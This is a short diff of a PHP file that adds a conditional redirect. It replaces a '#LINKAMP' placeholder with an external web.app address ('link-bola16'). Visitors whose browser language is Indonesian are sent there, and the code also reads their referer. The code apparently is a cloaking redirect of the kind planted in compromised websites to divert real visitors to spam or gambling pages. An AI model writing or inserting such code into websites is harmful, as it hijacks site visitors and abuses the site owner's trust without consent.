@@ -15,7 +15,7 @@ $s_ref = $_SERVER['HTTP_REFERER'];
     }
     $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
     if ($browserLang == 'id') {
-        header("Location: #LINKAMP");
+        header("Location: https://link-bola16.web.app/");
         exit;
     }
 /**
